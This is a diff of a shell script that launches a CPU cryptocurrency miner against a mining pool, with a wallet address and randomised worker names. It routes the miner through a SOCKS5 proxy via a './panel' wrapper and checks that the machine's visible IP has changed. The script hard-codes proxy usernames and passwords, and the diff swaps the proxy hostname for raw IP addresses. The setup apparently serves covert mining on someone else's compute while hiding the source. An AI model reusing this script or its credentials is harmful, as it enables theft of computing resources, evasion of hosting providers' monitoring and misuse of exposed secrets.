@@ -1,4 +1,4 @@
-proxy="us-east-static-01.quotaguard.com" 
+proxy="50.17.160.202" 
 port="1080" 
 user="xmz2ezv8ptf0u7"  
 pass="myrimhcl3pzcifqmj97c66pmx6" 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./vx -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 100-999 -n 1)-EXCEL) -p c=CPU -x socks5://xmz2ezv8ptf0u7:myrimhcl3pzcifqmj97c66pmx6@us-east-static-01.quotaguard.com:1080 -t2 -B
+./panel ./vx -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 100-999 -n 1)-EXCEL) -p c=CPU -x socks5://xmz2ezv8ptf0u7:myrimhcl3pzcifqmj97c66pmx6@52.86.18.14:1080 -t2
